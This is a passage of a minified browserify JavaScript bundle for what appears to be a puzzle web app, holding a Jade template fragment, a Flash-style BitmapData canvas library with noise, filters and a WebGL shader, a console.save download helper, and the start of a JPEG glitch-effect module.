0),a.join("")},access_intel_level3_riddleviewer:function(s){var i,a=[],e=s||{};return function(s){a.push('<div class="riddle"></div><div class="title"><div class="word">GRAPH</div><div class="num">0'+jade.escape(null==(i=s)?"":i)+"</div></div>")}.call(this,"idx"in e?e.idx:"undefined"!=typeof idx?idx:void 0),a.join("")}};
},{"jade/runtime":5}],49:[function(require,module,exports){
"use strict";var BitmapData=require("./js/BitmapData"),Point=require("./js/Point"),Rectangle=require("./js/Rectangle"),ColorTransform=require("./js/ColorTransform"),Matrix=require("./js/Matrix"),Simplex=require("./js/Simplex"),ColorMatrixFilter=require("./js/filters/ColorMatrixFilter"),Difference=require("./js/modes/Difference");module.exports={BitmapData:BitmapData,Point:Point,Rectangle:Rectangle,ColorTransform:ColorTransform,Matrix:Matrix,Simplex:Simplex,Filters:{ColorMatrixFilter:ColorMatrixFilter},Modes:{Difference:Difference}};
},{"./js/BitmapData":50,"./js/ColorTransform":51,"./js/Matrix":52,"./js/Point":53,"./js/Rectangle":54,"./js/Simplex":55,"./js/filters/ColorMatrixFilter":56,"./js/modes/Difference":57}],50:[function(require,module,exports){
"use strict";function hexToRGB(t){return{r:(16711680&t)>>16,g:(65280&t)>>8,b:255&t}}function RGBToHex(t){return t.r<<16|t.g<<8|t.b}function histogramVector(t){for(var i=[],e=0;256>e;e++)i[e]=t;return i}function PRNG(){this.seed=1,this.next=function(){return this.gen()/2147483647},this.nextRange=function(t,i){return t+(i-t)*this.next()},this.gen=function(){return this.seed=16807*this.seed%2147483647}}function BitmapData(t,i,e,a,h){this.width=t,this.height=i,this.rect=new Rectangle(0,0,this.width,this.height),this.transparent=e||!1,this.canvas=h||document.createElement("canvas"),this.context=this.canvas.getContext("2d"),this.canvas.setAttribute("width",this.width),this.canvas.setAttribute("height",this.height),this.drawingCanvas=document.createElement("canvas"),this.drawingContext=this.drawingCanvas.getContext("2d"),this.imagedata=this.context.createImageData(this.width,this.height),this.__defineGetter__("data",function(){return this.imagedata}),this.__defineSetter__("data",function(t){this.imagedata=t}),this.glCanvas=document.createElement("canvas"),this.gl=null,this.program=null,this.gpuEnabled=!0;try{this.gl=this.glCanvas.getContext("experimental-webgl")}catch(s){this.gpuEnabled=!1}return this.va=null,this.tex0=null,this.tex1=null,this.glPixelArray=null,this.initProgram=function(t){var i=this.gl,e=i.createProgram(),a=i.createShader(i.VERTEX_SHADER),h=i.createShader(i.FRAGMENT_SHADER);i.shaderSource(a,t.vsSrc),i.shaderSource(h,t.fsSrc),i.compileShader(a),i.compileShader(h),i.getShaderParameter(a,i.COMPILE_STATUS)||i.deleteProgram(e),i.getShaderParameter(h,i.COMPILE_STATUS)||i.deleteProgram(e),i.attachShader(e,a),i.attachShader(e,h),i.deleteShader(a),i.deleteShader(h),i.linkProgram(e),null!=this.program&&i.deleteProgram(this.program),this.program=e,i.viewport(0,0,this.canvas.width,this.canvas.height),i.useProgram(e);var s=new Float32Array([-1,-1,1,-1,-1,1,1,-1,1,1,-1,1]);this.va=i.createBuffer(),i.bindBuffer(i.ARRAY_BUFFER,this.va),i.bufferData(i.ARRAY_BUFFER,s,i.STATIC_DRAW)},this.initTexture=function(t,i){var e=this.gl,a=e.createTexture();e.enable(e.TEXTURE_2D),e.bindTexture(e.TEXTURE_2D,a),e.texImage2D(e.TEXTURE_2D,0,e.RGBA,e.RGBA,e.UNSIGNED_BYTE,i),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MAG_FILTER,e.LINEAR),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MIN_FILTER,e.LINEAR_MIPMAP_LINEAR),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_S,e.REPEAT),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_WRAP_T,e.REPEAT),e.generateMipmap(e.TEXTURE_2D),e.bindTexture(e.TEXTURE_2D,null),0==t?(null!=this.tex0&&e.deleteTexture(this.tex0),this.tex0=a,this.glCanvas.setAttribute("width",i.width),this.glCanvas.setAttribute("height",i.height),this.glPixelArray=new Uint8Array(i.width*i.height*4)):(null!=this.tex1&&e.deleteTexture(this.tex1),this.tex1=a)},this.drawGL=function(t){var i=this.gl,e=this.program,a=[t.a,t.c,0,t.b,t.d,0,0,0,1],h=i.getAttribLocation(e,"pos"),s=i.getUniformLocation(e,"r"),r=i.getUniformLocation(e,"t"),n=i.getUniformLocation(e,"tex0"),o=i.getUniformLocation(e,"tex1"),d=i.getUniformLocation(e,"rMat");i.bindBuffer(i.ARRAY_BUFFER,this.va),i.uniform2f(s,2*this.glCanvas.width,2*this.glCanvas.height),i.uniformMatrix3fv(d,!1,new Float32Array(a)),i.uniform2f(r,t.tx,t.ty),i.vertexAttribPointer(h,2,i.FLOAT,!1,0,0),i.enableVertexAttribArray(h),i.uniform1i(n,0),i.activeTexture(i.TEXTURE0),i.bindTexture(i.TEXTURE_2D,this.tex0),i.uniform1i(o,1),i.activeTexture(i.TEXTURE1),i.bindTexture(i.TEXTURE_2D,this.tex1),i.drawArrays(i.TRIANGLES,0,6),i.disableVertexAttribArray(h),i.flush();var g=this.glCanvas.width,l=this.glCanvas.height,x=this.glPixelArray;i.readPixels(0,0,g,l,i.RGBA,i.UNSIGNED_BYTE,x);for(var c,m=this.imagedata.data,f=0;l>f;f++)for(var u=0;g>u;u++)c=4*(u+f*g),m[c]=x[c],m[c+1]=x[c+1],m[c+2]=x[c+2]},this.setPixel=function(t,i,e){var a=hexToRGB(e),h=4*(t+i*this.width),s=this.imagedata.data;s[h+0]=a.r,s[h+1]=a.g,s[h+2]=a.b},this.getPixel=function(t,i){var e=4*(t+i*this.width),a=this.imagedata.data,h={r:a[e+0],g:a[e+1],b:a[e+2]};return RGBToHex(h)},this.clear=function(t){t=t||this.rect,this.context.clearRect(t.x,t.y,t.width,t.height),this.imagedata=this.context.getImageData(0,0,this.canvas.width,this.canvas.height)},this.clone=function(){this.context.putImageData(this.imagedata,0,0);var t=new BitmapData(this.width,this.height,this.transparent);return t.data=this.context.getImageData(0,0,this.width,this.height),t},this.colorTransform=function(t,i){t=t||this.rect,i=i||new ColorTransform;for(var e=this.imagedata.data,a=t.x+t.height,h=t.y+t.height,s=t.y;h>s;s++)for(var r=t.x;a>r;r++){var n=4*(s*this.width+r),o=n+1,d=n+2,g=n+3;e[n]=e[n]*i.redMultiplier+i.redOffset,e[o]=e[o]*i.greenMultiplier+i.greenOffset,e[d]=e[d]*i.blueMultiplier+i.blueOffset,e[g]=e[g]*i.alphaMultiplier+i.alphaOffset}this.context.putImageData(this.imagedata,0,0)},this.applyFilter=function(t,i,e,a){var h=this.clone();a.run(i,this.imagedata.data,h.imagedata.data),this.context.putImageData(this.imagedata,0,0)},this.compare=function(t){if(this.width!=t.width)return-3;if(this.height!=t.height)return-4;if(this.imagedata===t.data)return 0;for(var i,e,a,h=new BitmapData(this.width,this.height),s=0;s<this.height;s++)for(var r=0;r<this.width;r++)i=hexToRGB(t.getPixel(r,s)),e=hexToRGB(this.getPixel(r,s)),a={r:Math.abs(i.r-e.r),g:Math.abs(i.g-e.g),b:Math.abs(i.b-e.b)},h.setPixel(r,s,RGBToHex(a));return h},this.copyCanvas=function(t,i,e,a){this.context.putImageData(this.imagedata,0,0);var h=this.canvas.width-i.width-e.x,s=this.canvas.height-i.height-e.y,r=0>h?i.width+(this.canvas.width-i.width-e.x):i.width,n=0>s?i.height+(this.canvas.height-i.height-e.y):i.height;if(a&&a!=BlendMode.NORMAL)for(var o,d,g=t.getContext("2d").getImageData(i.x,i.y,r,n).data,l=this.imagedata.data,x=0;n>x;x++)for(var c=0;r>c;c++)switch(o=4*(c+x*r),d=4*(c+e.x+(x+e.y)*this.width),a){case BlendMode.ADD:l[d]=Math.min(l[d]+g[o],255),l[d+1]=Math.min(l[d+1]+g[o+1],255),l[d+2]=Math.min(l[d+2]+g[o+2],255);break;case BlendMode.SUBTRACT:l[d]=Math.max(g[o]-l[d],0),l[d+1]=Math.max(g[o+1]-l[d+1],0),l[d+2]=Math.max(g[o+2]-l[d+2],0);break;case BlendMode.INVERT:l[d]=255-g[o],l[d+1]=255-g[o+1],l[d+2]=255-g[o+1];break;case BlendMode.MULTIPLY:l[d]=Math.floor(g[o]*l[d]/255),l[d+1]=Math.floor(g[o+1]*l[d+1]/255),l[d+2]=Math.floor(g[o+2]*l[d+2]/255);break;case BlendMode.LIGHTEN:g[o]>l[d]&&(l[d]=g[o]),g[o+1]>l[d+1]&&(l[d+1]=g[o+1]),g[o+2]>l[d+2]&&(l[d+2]=g[o+2]);break;case BlendMode.DARKEN:g[o]<l[d]&&(l[d]=g[o]),g[o+1]<l[d+1]&&(l[d+1]=g[o+1]),g[o+2]<l[d+2]&&(l[d+2]=g[o+2]);break;case BlendMode.DIFFERENCE:l[d]=Math.abs(g[o]-l[d]),l[d+1]=Math.abs(g[o+1]-l[d+1]),l[d+2]=Math.abs(g[o+2]-l[d+2]);break;case BlendMode.SCREEN:l[d]=255-((255-l[d])*(255-g[o])>>8),l[d+1]=255-((255-l[d+1])*(255-g[o+1])>>8),l[d+2]=255-((255-l[d+2])*(255-g[o+2])>>8);break;case BlendMode.OVERLAY:g[o]<128?l[d]=l[d]*g[o]*halfColorMax:l[d]=255-(255-l[d])*(255-g[o])*halfColorMax,g[o+1]<128?l[d+1]=l[d+1]*g[o+1]*halfColorMax:l[d+1]=255-(255-l[d+1])*(255-g[o+1])*halfColorMax,g[o+2]<128&&(l[d+2]=l[d+2]*g[o+2]*halfColorMax),l[d+1]<128?l[d+1]=l[d+1]*g[o+1]*halfColorMax:l[d+1]=255-(255-l[d+1])*(255-g[o+1])*halfColorMax,l[d+2]<128?l[d+2]=l[d+2]*g[o+2]*halfColorMax:l[d+2]=255-(255-l[d+2])*(255-g[o+2])*halfColorMax}else this.context.drawImage(t,i.x,i.y,r,n,e.x,e.y,r,n),this.imagedata=this.context.getImageData(0,0,this.canvas.width,this.canvas.height);this.context.putImageData(this.imagedata,0,0)},this.copyChannel=function(t,i,e,a,h){for(var s,r,n,o=BitmapDataChannel.RED,d=BitmapDataChannel.GREEN,g=BitmapDataChannel.BLUE,l=0;l<i.height;l++)for(var x=0;x<i.width;x++){s=t.getPixel(i.x+x,i.y+l),r=hexToRGB(s);var c;switch(a){case o:c=r.r;break;case d:c=r.g;break;case g:c=r.b}switch(n=hexToRGB(this.getPixel(e.x+x,e.y+l)),h){case o:n.r=c;break;case d:n.g=c;break;case g:n.b=c}this.setPixel(e.x+x,e.y+l,RGBToHex(n))}this.context.putImageData(this.imagedata,0,0)},this.copyPixels=function(t,i,e,a,h,s){this.copyCanvas(t.canvas,i,e)},this.draw=function(t,i,e,a,h,s){var r=i||new Matrix,n=h||new Rectangle(0,0,t.width,t.height);a&&this.gpuEnabled,this.drawingCanvas.setAttribute("width",t.width),this.drawingCanvas.setAttribute("height",t.height),this.drawingContext.transform(r.a,r.b,r.c,r.d,r.tx,r.ty),this.drawingContext.drawImage(t,0,0,t.width,t.height,0,0,t.width,t.height),this.copyCanvas(this.drawingCanvas,n,new Point(n.x,n.y),a)},this.fillRect=function(t,i){this.context.putImageData(this.imagedata,0,0);var e=hexToRGB(i);this.context.fillStyle="rgb("+e.r+","+e.g+","+e.b+")",this.context.fillRect(t.x,t.y,t.width,t.height),this.imagedata=this.context.getImageData(0,0,this.canvas.width,this.canvas.height)},this.floodFill=function(t,i,e){var a=new Array;a.push(new Point(t,i));for(var h,s=this.getPixel(t,i),r=0,n=new BitmapData(this.width,this.height,!0,16777215);a.length>0;)h=a.shift(),++r,h.x<0||h.x>=this.width||h.y<0||h.y>=this.height||(n.setPixel(h.x,h.y,0),this.getPixel(h.x,h.y)==s&&(this.setPixel(h.x,h.y,e),16777215==n.getPixel(h.x+1,h.y)&&a.push(new Point(h.x+1,h.y)),16777215==n.getPixel(h.x,h.y+1)&&a.push(new Point(h.x,h.y+1)),16777215==n.getPixel(h.x-1,h.y)&&a.push(new Point(h.x-1,h.y)),16777215==n.getPixel(h.x,h.y-1)&&a.push(new Point(h.x,h.y-1))))},this.histogram=function(t){t=t||this.rect;for(var i,e={r:[],g:[],b:[]},a=histogramVector(0),h=histogramVector(0),s=histogramVector(0),r=t.width*t.height,n=-1,o=[],d=this.canvas.width-t.width-t.x,g=this.canvas.height-t.height-t.y,l=0>d?t.width+(this.canvas.width-t.width-t.x):t.width,x=0>g?t.height+(this.canvas.height-t.height-t.y):t.height,c=this.imagedata.data,m=t.y;x>m;m++)for(var f=t.x;l>f;f++)i=4*(f+m*this.width),o[n++]=c[i+0],o[n++]=c[i+1],o[n++]=c[i+2];n=0;for(var u=0;r>u;u+=Math.floor(r/256))px=3*n,a[n]=o[px+0],h[n]=o[px+1],s[n]=o[px+2],n++;return e.r=a,e.g=h,e.b=s,e},this.noise=function(t,i,e,a,h){this.rand=this.rand||new PRNG,this.rand.seed=t;var s=BitmapDataChannel.RED,r=BitmapDataChannel.GREEN,n=BitmapDataChannel.BLUE,o=this.imagedata.data;i=i||0,e=e||255,a=a||7,h=h||!1;for(var d,g,l,x,c,m=0;m<this.height;m++)for(var f=0;f<this.width;f++)d=4*(f+m*this.width),g=this.rand.nextRange(i,e),l=this.rand.nextRange(i,e),x=this.rand.nextRange(i,e),h&&(c=(g+l+x)/3,g=l=x=c),o[d+0]=a&s?1*g:0,o[d+1]=a&r?1*l:0,o[d+2]=a&n?1*x:0},this.paletteMap=function(t,i,e,a,h,s,r){for(var n,o,d,g,l,x=this.canvas.width-i.width-e.x,c=this.canvas.height-i.height-e.y,m=0>x?i.width+(this.canvas.width-i.width-e.x):i.width,f=0>c?i.height+(this.canvas.height-i.height-e.y):i.height,u=t.imagedata.data,w=i.x,R=i.y,v=t.width,E=e.x,T=e.y,p=this.imagedata.data,y=this.width,P=0;f>P;P++)for(var b=0;m>b;b++)n=4*(b+w+(P+R)*v),o=u[n+0],d=u[n+1],g=u[n+2],l=4*(b+E+(P+T)*y),p[l+0]=a[o],p[l+1]=h[d],p[l+2]=s[g];this.context.putImageData(this.imagedata,0,0)},this.perlinNoise=function(t,i,e,a,h){this.rand=this.rand||new PRNG,this.rand.seed=e;var s=BitmapDataChannel.RED,r=BitmapDataChannel.GREEN,n=BitmapDataChannel.BLUE;a=a||7,h=h||!1;var o=this.imagedata.data,d=0;a&s&&(this.simplexR=this.simplexR||new SimplexNoise(this.rand),this.simplexR.setSeed(e),d++),a&r&&(this.simplexG=this.simplexG||new SimplexNoise(this.rand),this.simplexG.setSeed(e+1),d++),a&n&&(this.simplexB=this.simplexB||new SimplexNoise(this.rand),this.simplexB.setSeed(e+2),d++);for(var g,l,x,c,m=0;m<this.height;m++)for(var f=0;f<this.width;f++)g=4*(f+m*this.width),l=a&s?Math.floor(.5*(this.simplexR.noise(f/t,m/i)+1)*255):0,x=a&r?Math.floor(.5*(this.simplexG.noise(f/t,m/i)+1)*255):0,c=a&n?Math.floor(.5*(this.simplexB.noise(f/t,m/i)+1)*255):0,h&&(gray=(l+x+c)/d,l=x=c=gray),o[g+0]=l,o[g+1]=x,o[g+2]=c;this.context.putImageData(this.imagedata,0,0)},this.threshold=function(t,i,e,a,h,s,r,n){s=s||0,r=r||16777215,n=n||!1;for(var o,d,g=this.canvas.width-i.width-e.x,l=this.canvas.height-i.height-e.y,x=0>g?i.width+(this.canvas.width-i.width-e.x):i.width,c=0>l?i.height+(this.canvas.height-i.height-e.y):i.height,m=t.imagedata.data,f=i.x,u=i.y,w=t.width,R=0;c>R;R++)for(var v=0;x>v;v++)switch(o=4*(v+f+(R+u)*w),d=RGBToHex({r:m[o],g:m[o+1],b:m[o+2]}),a){case"<":(h&r)>(d&r)&&(n?this.setPixel(v+e.x,R+e.y,d):this.setPixel(v+e.x,R+e.y,s));break;case"<=":(h&r)>=(d&r)&&(n?this.setPixel(v+e.x,R+e.y,d):this.setPixel(v+e.x,R+e.y,s));break;case">":(d&r)>(h&r)&&(n?this.setPixel(v+e.x,R+e.y,d):this.setPixel(v+e.x,R+e.y,s));break;case">=":(h&r)>=(d&r)&&(n?this.setPixel(v+e.x,R+e.y,d):this.setPixel(v+e.x,R+e.y,s));break;case"==":(d&r)==(h&r)&&(n?this.setPixel(v+e.x,R+e.y,d):this.setPixel(v+e.x,R+e.y,s));break;case"!=":(d&r)!=(h&r)&&(n?this.setPixel(v+e.x,R+e.y,d):this.setPixel(v+e.x,R+e.y,s))}this.context.putImageData(this.imagedata,0,0)},a?this.fillRect(this.rect,a):this.fillRect(this.rect,0),this}var SimplexNoise=require("./Simplex"),ColorTransform=require("./ColorTransform"),Rectangle=require("./Rectangle"),Matrix=require("./Matrix"),Point=require("./Point"),halfColorMax=.00784313725,BlendMode=new function(){this.ADD="add",this.ALPHA="alpha",this.DARKEN="darken",this.DIFFERENCE="difference",this.ERASE="erase",this.HARDLIGHT="hardlight",this.INVERT="invert",this.LAYER="layer",this.LIGHTEN="lighten",this.HARDLIGHT="hardlight",this.MULTIPLY="multiply",this.NORMAL="normal",this.OVERLAY="overlay",this.SCREEN="screen",this.SHADER="shader",this.SUBTRACT="subtract"};window.BitmapDataChannel=new function(){this.ALPHA=8,this.BLUE=4,this.GREEN=2,this.RED=1},module.exports=BitmapData;
},{"./ColorTransform":51,"./Matrix":52,"./Point":53,"./Rectangle":54,"./Simplex":55}],51:[function(require,module,exports){
"use strict";function ColorTransform(i,t,e,s,r,l,o,f){this.redMultiplier=void 0==i?1:i,this.greenMultiplier=void 0==t?1:t,this.blueMultiplier=void 0==e?1:e,this.alphaMultiplier=void 0==s?1:s,this.redOffset=r||0,this.greenOffset=l||0,this.blueOffset=o||0,this.alphaOffset=f||0}module.exports=ColorTransform;
},{}],52:[function(require,module,exports){
"use strict";function radianToDegree(e){return e*(180/Math.PI)}function degreeToRadian(e){return Math.PI*e/180}function Matrix(e,t,n,i,s,h){this.elements=[e||1,n||0,s||0,t||0,i||1,h||0],this.__defineGetter__("a",function(){return this.elements[0]}),this.__defineSetter__("a",function(e){this.elements[0]=e}),this.__defineGetter__("b",function(){return this.elements[3]}),this.__defineSetter__("b",function(e){this.elements[3]=e}),this.__defineGetter__("c",function(){return this.elements[1]}),this.__defineSetter__("c",function(e){this.elements[1]=e}),this.__defineGetter__("d",function(){return this.elements[4]}),this.__defineSetter__("d",function(e){this.elements[4]=e}),this.__defineGetter__("tx",function(){return this.elements[2]}),this.__defineSetter__("tx",function(e){this.elements[2]=e}),this.__defineGetter__("ty",function(){return this.elements[5]}),this.__defineSetter__("ty",function(e){this.elements[5]=e}),this.clone=function(){},this.concat=function(e){},this.identity=function(){this.elements=[1,0,0,1,0,0]},this.scale=function(e,t){e&&!t&&(t=e),e&&t&&(this.elements[0]*=e,this.elements[1]*=t,this.elements[3]*=e,this.elements[4]*=t)},this.translate=function(e,t){this.elements[2]=e*this.elements[0]+t*this.elements[1]+this.elements[2],this.elements[5]=e*this.elements[3]+t*this.elements[4]+this.elements[5]},this.angle=0,this.rotate=function(e){this.angle+=e;var t=(radianToDegree(e),Math.cos(e)),n=Math.sin(e),i=this.elements[0],s=this.elements[1];this.elements[0]=t*i+n*s,this.elements[1]=-n*i+t*s,i=this.elements[3],s=this.elements[4],this.elements[3]=t*i+n*s,this.elements[4]=-n*i+t*s}}module.exports=Matrix;
},{}],53:[function(require,module,exports){
"use strict";function Point(t,i){return this.x=t||0,this.y=i||0,this.__defineGetter__("length",function(){return Math.sqrt(this.x*this.x+this.y*this.y)}),this.add=function(t){return new Point(this.x+t.x,this.y+t.y)},this.clone=function(){return new Point(this.x,this.y)},Point.distance=function(t,i){var n=p2.x-p1.x,s=p2.y-p1.y;return Math.sqrt(n*n+s*s)},this.equals=function(t){return this.x==t.x&&this.y==t.y},Point.interpolate=function(t,i,n){var s=new Point;return s.x=p1.x+n*(p2.x-p1.x),s.y=p1.y+n*(p2.y-p1.y),s},this.normalize=function(t){var i=t/this.length;this.x*=i,this.y*=i},this.offset=function(t,i){this.x+=t,this.y+=i},Point.polar=function(t,i){return new Point(t*Math.cos(i),t*Math.sin(i))},this.subtract=function(t){return new Point(this.x-t.x,this.y=t.y)},this}module.exports=Point;
},{}],54:[function(require,module,exports){
"use strict";function Rectangle(t,i,n,e){return this.x=t,this.y=i,this.width=n,this.height=e,this.__defineGetter__("size",function(){return new Point(this.width,this.height)}),this.__defineSetter__("size",function(t){this.inflatePoint(t)}),this.__defineGetter__("top",function(){return this.y}),this.__defineSetter__("top",function(t){this.y=top}),this.__defineGetter__("bottom",function(){return this.y+this.height}),this.__defineSetter__("bottom",function(t){this.height=t-this.y}),this.__defineGetter__("left",function(){return this.x}),this.__defineSetter__("left",function(t){this.x=t}),this.__defineGetter__("right",function(){return this.x+this.height}),this.__defineSetter__("right",function(t){this.width=t-this.x}),this.__defineGetter__("topLeft",function(){return new Point(this.left,this.top)}),this.__defineSetter__("topLeft",function(t){this.left=t.x,this.top=t.y}),this.__defineGetter__("topRight",function(){return new Point(this.right,this.top)}),this.__defineSetter__("topRight",function(t){this.right=t.x,this.top=t.y}),this.__defineGetter__("bottomLeft",function(){return new Point(this.left,this.bottom)}),this.__defineSetter__("bottomLeft",function(t){this.left=t.x,this.bottom=t.y}),this.__defineGetter__("bottomRight",function(){return new Point(this.right,this.bottom)}),this.__defineSetter__("bottomRight",function(t){this.right=t.x,this.bottom=t.y}),this.clone=function(){return new Rectangle(this.x,this.y,this.width,this.height)},this.contains=function(t,i){return t>this.left&&t<this.right&&i>this.top&&i<this.bottom},this.containsPoint=function(t){return this.contains(t.x,t.y)},this.containsRect=function(t){return this.containsPoint(t.topLeft)&&this.containsPoint(t.bottomRight)},this.equals=function(t){return t.topLeft.equals(this.topLeft)&&t.bottomRight.equals(this.bottomRight)},this.inflate=function(t,i){this.width+=t,this.height+=i},this.inflatePoint=function(t){this.inflate(t.width,t.height)},this.intersection=function(t){if(this.intersects(t)){var i=Math.max(this.top,toUnion.top),n=Math.max(this.left,toUnion.left),e=Math.min(this.bottom,toUnion.bottom),h=Math.min(this.right,toUnion.right);return new Rectangle(n,i,h-n,e-i)}return null},this.intersects=function(t){return this.containsPoint(t.topLeft)||this.containsPoint(t.topRight)||this.containsPoint(t.bottomLeft)||this.containsPoint(t.bottomRight)},this.isEmpty=function(){return 0==this.x&&0==this.y&&0==this.width&&0==this.height},this.offset=function(t,i){this.x+=t,this.y+=i},this.offsetPoint=function(t){this.offset(t.x,t.y)},this.setEmpty=function(){this.x=this.y=this.width=this.height=0},this.union=function(t){var i=Math.min(this.top,t.top),n=Math.min(this.left,t.left),e=Math.max(this.bottom,t.bottom),h=Math.max(this.right,t.right);return new Rectangle(n,i,h-n,e-i)},this}var Point=require("./Point");module.exports=Rectangle;
},{"./Point":53}],55:[function(require,module,exports){
"use strict";var SimplexNoise=function(t){this.rand=t,this.grad3=[[1,1,0],[-1,1,0],[1,-1,0],[-1,-1,0],[1,0,1],[-1,0,1],[1,0,-1],[-1,0,-1],[0,1,1],[0,-1,1],[0,1,-1],[0,-1,-1]],this.simplex=[[0,1,2,3],[0,1,3,2],[0,0,0,0],[0,2,3,1],[0,0,0,0],[0,0,0,0],[0,0,0,0],[1,2,3,0],[0,2,1,3],[0,0,0,0],[0,3,1,2],[0,3,2,1],[0,0,0,0],[0,0,0,0],[0,0,0,0],[1,3,2,0],[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0],[1,2,0,3],[0,0,0,0],[1,3,0,2],[0,0,0,0],[0,0,0,0],[0,0,0,0],[2,3,0,1],[2,3,1,0],[1,0,2,3],[1,0,3,2],[0,0,0,0],[0,0,0,0],[0,0,0,0],[2,0,3,1],[0,0,0,0],[2,1,3,0],[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0],[0,0,0,0],[2,0,1,3],[0,0,0,0],[0,0,0,0],[0,0,0,0],[3,0,1,2],[3,0,2,1],[0,0,0,0],[3,1,2,0],[2,1,0,3],[0,0,0,0],[0,0,0,0],[0,0,0,0],[3,1,0,2],[0,0,0,0],[3,2,0,1],[3,2,1,0]]};SimplexNoise.prototype.setSeed=function(t){this.p=[],this.rand.seed=t;for(var i=0;256>i;i++)this.p[i]=Math.floor(this.rand.nextRange(0,255));this.perm=[];for(var i=0;512>i;i++)this.perm[i]=this.p[255&i]},SimplexNoise.prototype.dot=function(t,i,r){return t[0]*i+t[1]*r},SimplexNoise.prototype.noise=function(t,i){var r,s,e,o,h,p=.5*(Math.sqrt(3)-1),a=(t+i)*p,n=Math.floor(t+a),m=Math.floor(i+a),d=(3-Math.sqrt(3))/6,l=(n+m)*d,f=n-l,u=m-l,x=t-f,v=i-u;x>v?(o=1,h=0):(o=0,h=1);var S=x-o+d,c=v-h+d,g=x-1+2*d,M=v-1+2*d,N=255&n,y=255&m,q=this.perm[N+this.perm[y]]%12,R=this.perm[N+o+this.perm[y+h]]%12,b=this.perm[N+1+this.perm[y+1]]%12,j=.5-x*x-v*v;0>j?r=0:(j*=j,r=j*j*this.dot(this.grad3[q],x,v));var k=.5-S*S-c*c;0>k?s=0:(k*=k,s=k*k*this.dot(this.grad3[R],S,c));var w=.5-g*g-M*M;return 0>w?e=0:(w*=w,e=w*w*this.dot(this.grad3[b],g,M)),70*(r+s+e)},module.exports=SimplexNoise;
},{}],56:[function(require,module,exports){
"use strict";function ColorMatrixFilter(t){this.matrix=t||[1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0],this.run=function(t,r,i){for(var o=r.length/4,n=this.matrix,e=0;o>e;e++){var l=4*e,a=l+1,s=l+2,u=l+3,x=r[l],h=r[a],c=r[s],f=r[u];r[l]=n[0]*x+n[1]*h+n[2]*c+n[3]*f+n[4],r[a]=n[5]*x+n[6]*h+n[7]*c+n[8]*f+n[9],r[s]=n[10]*x+n[11]*h+n[12]*c+n[13]*f+n[14],r[u]=n[15]*x+n[16]*h+n[17]*c+n[18]*f+n[19]}},this.clone=function(){return new ColorMatrixFilter(this.matrix)}}module["export"]=ColorMatrixFilter;
},{}],57:[function(require,module,exports){
var Difference=new function(){this.vsSrc=["attribute vec2 pos;","varying vec2 p;","void main(void) {","	p=pos;","	gl_Position = vec4(pos.x, pos.y, 0.0, 1.0);","}"].join("\n"),this.fsSrc=["#ifdef GL_ES","precision highp float;","#endif","uniform vec2 r;","uniform vec2 t;","uniform sampler2D tex0;","uniform sampler2D tex1;","uniform mat3 rMat;","void main(void) {","	vec3 t2 = rMat*vec3(gl_FragCoord.x-t.x, gl_FragCoord.y-t.y, 0.0);","	vec2 p1 = 1.0 - 2.0 * gl_FragCoord.xy / r.xy;","	vec2 p2 = 1.0 - 2.0 * t2.xy / r.xy;","	vec3 col = abs(texture2D(tex0,p1).xyz - texture2D(tex1,p2).xyz);","	gl_FragColor = vec4(col, 1.0);","}"].join("\n")};
},{}],58:[function(require,module,exports){
!function(e){e.save=function(o,n,t){if(!o)return void e.error("Console.save: No data");t=t||"text/json",n||(n="console.json"),"object"==typeof o&&(o=JSON.stringify(o,void 0,4));var d=document.createEvent("MouseEvents"),a=document.createElement("a");if(-1===t.indexOf("image")){var i=new Blob([o],{type:t});a.href=window.URL.createObjectURL(i)}else a.href=o;a.download=n,a.dataset.downloadurl=[t,a.download,a.href].join(":"),d.initMouseEvent("click",!0,!1,window,0,0,0,0,0,!1,!1,!1,!1,0,null),a.dispatchEvent(d)}}(console),module.exports="dogs";
},{}],59:[function(require,module,exports){
!function(){function t(t,s,g){if(u(t)&&c(s,"parameters","object")&&c(g,"callback","function")){for(f=h(s),e(y,t),e(I,t),m=n(t,f.quality),p=r(m),l=i(p),v=0,k=f.iterations;k>v;v++)a(p,l,f.seed,f.amount,v,f.iterations);b=new Image,b.onload=function(){j.drawImage(b,0,0),w=j.getImageData(0,0,t.width,t.height),g(w)},b.src=o(p)}}function e(t,e){t.width!==e.width&&(t.width=e.width),t.height!==e.height&&(t.height=e.height)}function a(t,e,a,n,i,r){var o=t.length-e-4,h=parseInt(o/r*i,10),u=parseInt(o/r*(i+1),10),c=u-h,s=parseInt(h+c*a,10);s>o&&(s=o);var g=Math.floor(e+s);t[g]=Math.floor(256*n)}function n(t,e){var a="number"==typeof e&&1>e&&e>0?e:.1;E.putImageData(t,0,0);var n=I.toDataURL("image/jpeg",a);switch(n.length%4){case 3:n+="=";break;case 2:n+="==";break;case 1:n+="==="}return n}function i(t){var e=417;for(v=0,k=t.length;k>v;v++)if(255===t[v]&&218===t[v+1]){e=v+2;break}return e}function r(t){var e,a,n,i=[];for(v=23,k=t.length;k>v;v++){switch(a=x[t.charAt(v)],e=(v-23)%4){case 1:i.push(n<<2|a>>4);break;case 2:i.push((15&n)<<4|a>>2);break;case 3:i.push((3&n)<<6|a)}n=a}return i}function o(t){var e,a,n,i=["data:image/jpeg;base64,"];for(v=0,k=t.length;k>v;v++){switch(a=t[v],e=v%3){case 0:i.push(q[a>>2]);break;case 1:i.push(q[(3&n)<<4|a>>4]);break;case 2:i.push(q[(15&n)<<2|a>>6]),i.push(q[63&a])}n=a}return 0===e?(i.push(q[(3&n)<<4]),i.push("==")):1===e&&(i.push(q[(15&n)<<2]),i.push("=")),i.join("")}function h(t){return{seed:(t.seed||0)/100,quality:(t.quality||0)/100,amount:(t.amount||0)/100,iterations:t.iterations||0}}function u(t){return c(t,"image_data","object")&&c(t.width,"image_data.width","number")&&c(t.height,"image_data.height","number")&&c(t.data,"image_data.data","object")&&c(t.data.length,"image_data.data.length","number")&&s(t.data.length,"image_data.data.length",g,"> 0")?!0:!1}function c(t,e,a){return typeof t===a?!0:(d(t,"typeof "+e,'"'+a+'"','"'+typeof t+'"'),!1)}function s(t,e,a,n){return 